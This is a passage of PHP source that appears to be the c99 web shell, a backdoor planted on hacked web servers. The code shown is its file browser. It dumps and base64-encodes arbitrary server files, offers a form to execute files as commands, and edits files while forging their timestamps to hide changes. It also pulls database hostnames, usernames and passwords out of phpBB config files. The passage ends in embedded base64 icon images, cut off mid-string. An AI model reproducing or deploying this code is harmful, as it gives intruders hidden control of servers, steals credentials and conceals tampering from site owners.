    $ext = explode(".",$f);
    $c = count($ext)-1;
    $ext = $ext[$c];
    $ext = strtolower($ext);
    $rft = "";
    foreach($ftypes as $k=>$v) {if (in_array($ext,$v)) {$rft = $k; break;}}
    if (eregi("sess_(.*)",$f)) {$rft = "phpsess";}
    if (empty($ft)) {$ft = $rft;}
    $arr = array(
        array("<img src=\"".$surl."act=img&img=ext_diz\" border=\"0\">","info"),
        array("<img src=\"".$surl."act=img&img=ext_html\" border=\"0\">","html"),
        array("<img src=\"".$surl."act=img&img=ext_txt\" border=\"0\">","txt"),
        array("Code","code"),
        array("Session","phpsess"),
        array("<img src=\"".$surl."act=img&img=ext_exe\" border=\"0\">","exe"),
        array("SDB","sdb"),
        array("<img src=\"".$surl."act=img&img=ext_gif\" border=\"0\">","img"),
        array("<img src=\"".$surl."act=img&img=ext_ini\" border=\"0\">","ini"),
        array("<img src=\"".$surl."act=img&img=download\" border=\"0\">","download"),
        array("<img src=\"".$surl."act=img&img=ext_rtf\" border=\"0\">","notepad"),
        array("<img src=\"".$surl."act=img&img=change\" border=\"0\">","edit")
    );
    echo "<b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\">&nbsp;".$f." (".view_size(filesize($d.$f)).") &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".view_perms_color($d.$f)."</b><br>Select action/file-type:<br>";
    foreach($arr as $t) {
      if ($t[1] == $rft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><font color=green>".$t[0]."</font></a>";}
      elseif ($t[1] == $ft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b><u>".$t[0]."</u></b></a>";}
      else {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b>".$t[0]."</b></a>";}
      echo " (<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&white=1&d=".urlencode($d)."\" target=\"_blank\">+</a>) |";
    }
    echo "<hr size=\"1\" noshade>";
    if ($ft == "info") {
      echo "<b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> ".$d.$f."</td></tr><tr><td><b>Size</b></td><td> ".view_size(filesize($d.$f))."</td></tr><tr><td><b>MD5</b></td><td> ".md5_file($d.$f)."</td></tr>";
      if (!$win) {
        echo "<tr><td><b>Owner/Group</b></td><td> ";
        $ow = posix_getpwuid(fileowner($d.$f));
        $gr = posix_getgrgid(filegroup($d.$f));
        echo ($ow["name"]?$ow["name"]:fileowner($d.$f))."/".($gr["name"]?$gr["name"]:filegroup($d.$f));
      }
      echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&f=".urlencode($f)."&d=".urlencode($d)."\">".view_perms_color($d.$f)."</a></td></tr><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d.$f))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d.$f))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d.$f))."</td></tr></table>";
      $fi = fopen($d.$f,"rb");
      if ($fi) {
        if ($fullhexdump) {echo "<b>FULL HEXDUMP</b>"; $str = fread($fi,filesize($d.$f));}
        else {echo "<b>HEXDUMP PREVIEW</b>"; $str = fread($fi,$hexdump_lines*$hexdump_rows);}
        $n = 0;
        $a0 = "00000000<br>";
        $a1 = "";
        $a2 = "";
        for ($i=0; $i<strlen($str); $i++) {
          $a1 .= sprintf("%02X",ord($str[$i]))." ";
          switch (ord($str[$i])) {
            case 0:  $a2 .= "<font>0</font>"; break;
            case 32:
            case 10:
            case 13: $a2 .= "&nbsp;"; break;
            default: $a2 .= htmlspecialchars($str[$i]);
          }
          $n++;
          if ($n == $hexdump_rows) {
            $n = 0;
            if ($i+1 < strlen($str)) {$a0 .= sprintf("%08X",$i+1)."<br>";}
            $a1 .= "<br>";
            $a2 .= "<br>";
          }
        }
        echo "<table border=1 bgcolor=#666666>".
             "<tr><td bgcolor=#666666>".$a0."</td>".
             "<td bgcolor=#000000>".$a1."</td>".
             "<td bgcolor=#000000>".$a2."</td>".
             "</tr></table><br>";
      }
      $encoded = "";
      if ($base64 == 1) {
        echo "<b>Base64 Encode</b><br>";
        $encoded = base64_encode(file_get_contents($d.$f));
      }
      elseif($base64 == 2) {
        echo "<b>Base64 Encode + Chunk</b><br>";
        $encoded = chunk_split(base64_encode(file_get_contents($d.$f)));
      }
      elseif($base64 == 3) {
        echo "<b>Base64 Encode + Chunk + Quotes</b><br>";
        $encoded = base64_encode(file_get_contents($d.$f));
        $encoded = substr(preg_replace("!.{1,76}!","'\\0'.\n",$encoded),0,-2);
      }
      elseif($base64 == 4) {
        $text = file_get_contents($d.$f);
        $encoded = base64_decode($text);
        echo "<b>Base64 Decode";
    if (base64_encode($encoded) != $text) {echo " (failed)";}
    echo "</b><br>";
   }
   if (!empty($encoded))
   {
    echo "<textarea cols=80 rows=10>".htmlspecialchars($encoded)."</textarea><br><br>";
   }
   echo "<b>HEXDUMP:</b><nobr> [<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&fullhexdump=1&d=".urlencode($d)."\">Full</a>] [<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&d=".urlencode($d)."\">Preview</a>]<br><b>Base64: </b>
        <nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=1&d=".urlencode($d)."\">Encode</a>]&nbsp;</nobr>
        <nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=2&d=".urlencode($d)."\">+chunk</a>]&nbsp;</nobr>
        <nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=3&d=".urlencode($d)."\">+chunk+quotes</a>]&nbsp;</nobr>
        <nobr>[<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=info&base64=4&d=".urlencode($d)."\">Decode</a>]&nbsp;</nobr>
        <P>";
  }
  elseif ($ft == "html") {
   if ($white) {@ob_clean();}
   echo $r;
   if ($white) {c99shexit();}
  }
  elseif ($ft == "txt") {echo "<pre>".htmlspecialchars($r)."</pre>";}
  elseif ($ft == "ini") {echo "<pre>"; var_dump(parse_ini_file($d.$f,TRUE)); echo "</pre>";}
  elseif ($ft == "phpsess") {
   echo "<pre>";
   $v = explode("|",$r);
   echo $v[0]."<br>";
   var_dump(unserialize($v[1]));
   echo "</pre>";
  }
  elseif ($ft == "exe") {
   $ext = explode(".",$f);
   $c = count($ext)-1;
   $ext = $ext[$c];
   $ext = strtolower($ext);
   $rft = "";
   foreach($exeftypes as $k=>$v)
   {
    if (in_array($ext,$v)) {$rft = $k; break;}
   }
   $cmd = str_replace("%f%",$f,$rft);
   echo "<b>Execute file:</b><form action=\"".$surl."\" method=POST><input type=hidden name=act value=cmd><input type=\"text\" name=\"cmd\" value=\"".htmlspecialchars($cmd)."\" size=\"".(strlen($cmd)+2)."\"><br>Display in text-area<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\" checked><input type=hidden name=\"d\" value=\"".htmlspecialchars($d)."\"><br><input type=submit name=submit value=\"Execute\"></form>";
  }
  elseif ($ft == "sdb") {echo "<pre>"; var_dump(unserialize(base64_decode($r))); echo "</pre>";}
  elseif ($ft == "code") {
    if (ereg("php"."BB 2.(.*) auto-generated config file",$r)) {
      $arr = explode("\n",$r);
      if (count($arr == 18)) {
        include($d.$f);
        echo "<b>phpBB configuration is detected in this file!<br>";
        if ($dbms == "mysql4") {$dbms = "mysql";}
        if ($dbms == "mysql") {echo "<a href=\"".$surl."act=sql&sql_server=".htmlspecialchars($dbhost)."&sql_login=".htmlspecialchars($dbuser)."&sql_passwd=".htmlspecialchars($dbpasswd)."&sql_port=3306&sql_db=".htmlspecialchars($dbname)."\"><b><u>Connect to DB</u></b></a><br><br>";}
        else {echo "But, you can't connect to forum sql-base, because db-software=\"".$dbms."\" is not supported by ".$sh_name.". Please, report us for fix.";}
        echo "Parameters for manual connect:<br>";
        $cfgvars = array("dbms"=>$dbms,"dbhost"=>$dbhost,"dbname"=>$dbname,"dbuser"=>$dbuser,"dbpasswd"=>$dbpasswd);
        foreach ($cfgvars as $k=>$v) {echo htmlspecialchars($k)."='".htmlspecialchars($v)."'<br>";}
        echo "</b><hr size=\"1\" noshade>";
      }
    }
    echo "<div style=\"border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\">";
    if (!empty($white)) {@ob_clean();}
    highlight_file($d.$f);
    if (!empty($white)) {c99shexit();}
    echo "</div>";
  }
  elseif ($ft == "download") {
    @ob_clean();
    header("Content-type: application/octet-stream");
    header("Content-length: ".filesize($d.$f));
    header("Content-disposition: attachment; filename=\"".$f."\";");
    echo $r;
    exit;
  }
  elseif ($ft == "notepad") {
    @ob_clean();
    header("Content-type: text/plain");
    header("Content-disposition: attachment; filename=\"".$f.".txt\";");
    echo($r);
    exit;
  }
  elseif ($ft == "img") {
    $inf = getimagesize($d.$f);
    if (!$white) {
      if (empty($imgsize)) {$imgsize = 20;}
      $width = $inf[0]/100*$imgsize;
      $height = $inf[1]/100*$imgsize;
      echo "<center><b>Size:</b>&nbsp;";
      $sizes = array("100","50","20");
      foreach ($sizes as $v) {
        echo "<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=img&d=".urlencode($d)."&imgsize=".$v."\">";
        if ($imgsize != $v ) {echo $v;}
        else {echo "<u>".$v."</u>";}
        echo "</a>&nbsp;&nbsp;&nbsp;";
      }
      echo "<br><br><img src=\"".$surl."act=f&f=".urlencode($f)."&ft=img&white=1&d=".urlencode($d)."\" width=\"".$width."\" height=\"".$height."\" border=\"1\"></center>";
    }
    else {
      @ob_clean();
      $ext = explode($f,".");
      $ext = $ext[count($ext)-1];
      header("Content-type: ".$inf["mime"]);
      readfile($d.$f);
      exit;
    }
  }
  elseif ($ft == "edit") {
   if (!empty($submit))
   {
    if ($filestealth) {$stat = stat($d.$f);}
    $fp = fopen($d.$f,"w");
    if (!$fp) {echo "<b>Can't write to file!</b>";}
    else
    {
     echo "<b>Saved!</b>";
     fwrite($fp,$edit_text);
     fclose($fp);
     if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);}
     $r = $edit_text;
    }
   }
   $rows = count(explode("\r\n",$r));
   if ($rows < 10) {$rows = 10;}
   if ($rows > 30) {$rows = 30;}
   echo "<form action=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."\" method=POST><input type=submit name=submit value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"location.href='".addslashes($surl."act=ls&d=".substr($d,0,-1))."';\" value=\"Back\"><br><textarea name=\"edit_text\" cols=\"122\" rows=\"".$rows."\">".htmlspecialchars($r)."</textarea></form>";
  }
  elseif (!empty($ft)) {echo "<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.</b></center>";}
  else {echo "<center><b>Unknown extension (".$ext."), please, select type manually.</b></center>";}
}
echo "</div>\n";
}
}
else {
@ob_clean();
$images = array(
"arrow_ltr"=>
"R0lGODlhJgAWAIABAP///wAAACH5BAHoAwEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQSIrUZGZoerKf28KjPNPOaku5RfZ+uQsKh8RiogAAOw==",
"back"=>
"R0lGODlhFAAUAKIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
"aLrc/jDKSWWpjVysSNiYJ4CUOBJoqjniILzwuzLtYN/3zBSErf6kBW+gKRiPRghPh+EFK0mOUEqt".
"Wg0JADs=",
"buffer"=>
"R0lGODlhFAAUAKIAAAAAAP////j4+N3d3czMzLKysoaGhv///yH5BAEAAAcALAAAAAAUABQAAANo".
"eLrcribG90y4F1Amu5+NhY2kxl2CMKwrQRSGuVjp4LmwDAWqiAGFXChg+xhnRB+ptLOhai1crEmD".
"Dlwv4cEC46mi2YgJQKaxsEGDFnnGwWDTEzj9jrPRdbhuG8Cr/2INZIOEhXsbDwkAOw==",
"change"=>
"R0lGODlhFAAUAMQfAL3hj7nX+pqo1ejy/f7YAcTb+8vh+6FtH56WZtvr/RAQEZecx9Ll/PX6/v3+".
"/3eHt6q88eHu/ZkfH3yVyIuQt+72/kOm99fo/P8AZm57rkGS4Hez6pil9oep3GZmZv///yH5BAEA".
"AB8ALAAAAAAUABQAAAWf4CeOZGme6NmtLOulX+c4TVNVQ7e9qFzfg4HFonkdJA5S54cbRAoFyEOC".
"wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA".
"CHkjE4aQkQ0AlSITan+ZAQqkiiQPj1AFAaMKEKYjD39QrKwKAa8nGQK8Agu/CxTCsCMexsfIxjDL".
"zMshADs=",
"delete"=>
"R0lGODlhFAAUAOZZAPz8/NPFyNgHLs0YOvPz8/b29sacpNXV1fX19cwXOfDw8Kenp/n5+etgeunp".
"6dcGLMMpRurq6pKSktvb2+/v7+1wh3R0dPnP17iAipxyel9fX7djcscSM93d3ZGRkeEsTevd4LCw".
"sGRkZGpOU+IfQ+EQNoh6fdIcPeHh4YWFhbJQYvLy8ui+xm5ubsxccOx8kcM4UtY9WeAdQYmJifWv".
"vHx8fMnJycM3Uf3v8rRue98ONbOzs9YFK5SUlKYoP+Tk5N0oSufn57ZGWsQrR9kIL5CQkOPj42Vl".
"ZeAPNudAX9sKMPv7+15QU5ubm39/f8e5u4xiatra2ubKz8PDw+pfee9/lMK0t81rfd8AKf///wAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5".
"BAEAAFkALAAAAAAUABQAAAesgFmCg4SFhoeIhiUfIImIMlgQB46GLAlYQkaFVVhSAIZLT5cbEYI4".
"STo5MxOfhQwBA1gYChckQBk1OwiIALACLkgxJilTBI69RFhDFh4HDJRZVFgPPFBR0FkNWDdMHA8G".
"BZTaMCISVgMC4IkVWCcaPSi96OqGNFhKI04dgr0QWFcKDL3A4uOIjVZZABxQIWDBLkIEQrRoQsHQ".
"jwVFHBgiEGQFIgQasYkcSbJQIAA7",
"download"=>
"R0lGODlhFAAUALMIAAD/AACAAIAAAMDAwH9/f/8AAP///wAAAP///wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAAUABQAAAROEMlJq704UyGOvkLhfVU4kpOJSpx5nF9YiCtLf0SuH7pu".
"EYOgcBgkwAiGpHKZzB2JxADASQFCidQJsMfdGqsDJnOQlXTP38przWbX3qgIADs=",
"forward"=>
"R0lGODlhFAAUAPIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
"aLrc/jDK2Qp9xV5WiN5G50FZaRLD6IhE66Lpt3RDbd9CQFSE4P++QW7He7UKPh0IqVw2l0RQSEqt".
"WqsJADs=",
"home"=>
"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzLKysoaGhmZmZgQEBP///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR+MMk5TTWI6ipyMoO3cUWRgeJoCCaLoKO0mq0ZxjNSBDWS".
"krqAsLfJ7YQBl4tiRCYFSpPMdRRCoQOiL4i8CgZgk09WfWLBYZHB6UWjCequwEDHuOEVK3QtgN/j".
"VwMrBDZvgF+ChHaGeYiCBQYHCH8VBJaWdAeSl5YiW5+goBIRADs=",
"mode"=>
"R0lGODlhHQAUALMAAAAAAP///6CgpN3d3czMzIaGhmZmZl9fX////wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAAdABQAAASBEMlJq70461m6/+AHZMUgnGiqniNWHHAsz3F7FUGu73xO".
"2BZcwGDoEXk/Uq4ICACeQ6fzmXTlns0ddle99b7cFvYpER55Z10Xy1lKt8wpoIsACrdaqBpYEYK/".
"dH1LRWiEe0pRTXBvVHwUd3o6eD6OHASXmJmamJUSY5+gnxujpBIRADs=",
"search"=>
"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP//".
"/wAAACH5BAEAAA4ALAAAAAAUABQAAASn0Ml5qj0z5xr6+JZGeUZpHIqRNOIRfIYiy+a6vcOpHOap".
"s5IKQccz8XgK4EGgQqWMvkrSscylhoaFVmuZLgUDAnZxEBMODSnrkhiSCZ4CGrUWMA+LLDxuSHsD".
"AkN4C3sfBX10VHaBJ4QfA4eIU4pijQcFmCVoNkFlggcMRScNSUCdJyhoDasNZ5MTDVsXBwlviRmr".
"Cbq7C6sIrqawrKwTv68iyA6rDhEAOw==",
"setup"=>
"R0lGODlhFAAUAMQAAAAAAP////j4+OPj493d3czMzMDAwLKyspaWloaGhnd3d2ZmZl9fX01NTUJC".
"QhwcHP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".
"ABAALAAAAAAUABQAAAWVICSKikKWaDmuShCUbjzMwEoGhVvsfHEENRYOgegljkeg0PF4KBIFRMIB".
"qCaCJ4eIGQVoIVWsTfQoXMfoUfmMZrgZ2GNDPGII7gJDLYErwG1vgW8CCQtzgHiJAnaFhyt2dwQE".
"OwcMZoZ0kJKUlZeOdQKbPgedjZmhnAcJlqaIqUesmIikpEixnyJhulUMhg24aSO6YyEAOw==",
"small_dir"=>
"R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp".
"/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=",
"small_unk"=>
"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAIep3BE9mllic3B5iVpjdMvh/MLc+y1U".
"p9Pm/GVufc7j/MzV/9Xm/EOm99bn/Njp/a7Q+tTm/LHS+eXw/t3r/Nnp/djo/Nrq/fj7/9vq/Nfo".
"/Mbe+8rh/Mng+7jW+rvY+r7Z+7XR9dDk/NHk/NLl/LTU+rnX+8zi/LbV++fx/e72/vH3/vL4/u31".
"/e31/uDu/dzr/Orz/eHu/fX6/vH4/v////v+/3ez6vf7//T5/kGS4Pv9/7XV+rHT+r/b+rza+vP4".
"/uz0/urz/u71/uvz/dTn/M/k/N3s/dvr/cjg+8Pd+8Hc+sff+8Te+/D2/rXI8rHF8brM87fJ8nmP".
"wr3N86/D8KvB8F9neEFotEBntENptENptSxUpx1IoDlfrTRcrZeeyZacxpmhzIuRtpWZxIuOuKqz".
"9ZOWwX6Is3WIu5im07rJ9J2t2Zek0m57rpqo1nKCtUVrtYir3vf6/46v4Yuu4WZvfr7P6sPS6sDQ".
"66XB6cjZ8a/K79/s/dbn/ezz/czd9mN0jKTB6ai/76W97niXz2GCwV6AwUdstXyVyGSDwnmYz4io".
"24Oi1a3B45Sy4ae944Ccz4Sj1n2GlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAjnACtVCkCw4JxJAQQqFBjAxo0MNGqsABQAh6CFA3nk0MHiRREVDhzsoLQwAJ0gT4ToecSHAYMz".
"aQgoDNCCSB4EAnImCiSBjUyGLobgXBTpkAA5I6pgmSkDz5cuMSz8yWlAyoCZFGb4SQKhASMBXJpM".
"uSrQEQwkGjYkQCTAy6AlUMhWklQBw4MEhgSA6XPgRxS5ii40KLFgi4BGTEKAsCKXihESCzrsgSQC".
"yIkUV+SqOYLCA4csAup86OGDkNw4BpQ4OaBFgB0TEyIUKqDwTRs4a9yMCSOmDBoyZu4sJKCgwIDj".
"yAsokBkQADs=",
"multipage"=>"R0lGODlhCgAMAJEDAP/////3mQAAAAAAACH5BAEAAAMALAAAAAAKAAwAAAIj3IR".
"pJhCODnovidAovBdMzzkixlXdlI2oZpJWEsSywLzRUAAAOw==",
"sort_asc"=>
"R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMa".
"SLrcPcE9GKUaQlQ5sN5PloFLJ35OoK6q5SYAOw==",
"sort_desc"=>
"R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMb".
"SLrcOjBCB4UVITgyLt5ch2mgSJZDBi7p6hIJADs=",
"sql_button_drop"=>
"R0lGODlhCQALAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".
"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".
"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".
"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".
"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".
"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".
"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".
"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".
"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".
"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAsA".
"AAg4AP8JREFQ4D+CCBOi4MawITeFCg/iQhEPxcSBlFCoQ5Fx4MSKv1BgRGGMo0iJFC2ehHjSoMt/".
"AQEAOw==",
"sql_button_empty"=>
"R0lGODlhCQAKAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".
"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".
"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".
"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".
"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".
"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".
"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".
"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".
"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".
"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAoA".
"AAgjAP8JREFQ4D+CCBOiMMhQocKDEBcujEiRosSBFjFenOhwYUAAOw==",
"sql_button_insert"=>
"R0lGODlhDQAMAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".
"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".
"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".
"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".
"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".
"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".
"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".
"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".
"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".
"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAANAAwA".
"AAgzAFEIHEiwoMGDCBH6W0gtoUB//1BENOiP2sKECzNeNIiqY0d/FBf+y0jR48eQGUc6JBgQADs=",
"up"=>
"R0lGODlhFAAUALMAAAAAAP////j4+OPj493d3czMzLKysoaGhk1NTf///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJq734ns1PnkcgjgXwhcNQrIVhmFonzxwQjnie27jg".
"+4Qgy3XgBX4IoHDlMhRvggFiGiSwWs5XyDftWplEJ+9HQCyx2c1YEDRfwwfxtop4p53PwLKOjvvV".
"IXtdgwgdPGdYfng1IVeJaTIAkpOUlZYfHxEAOw==",
"write"=>
"R0lGODlhFAAUALMAAAAAAP///93d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze".
"EQYQLUAsGgM0Wwt3bCJfQSFx10yyBlJn8RfEMgM9X+3qHWq5iED5yCsMCl111knDpuXfYls+IK61".
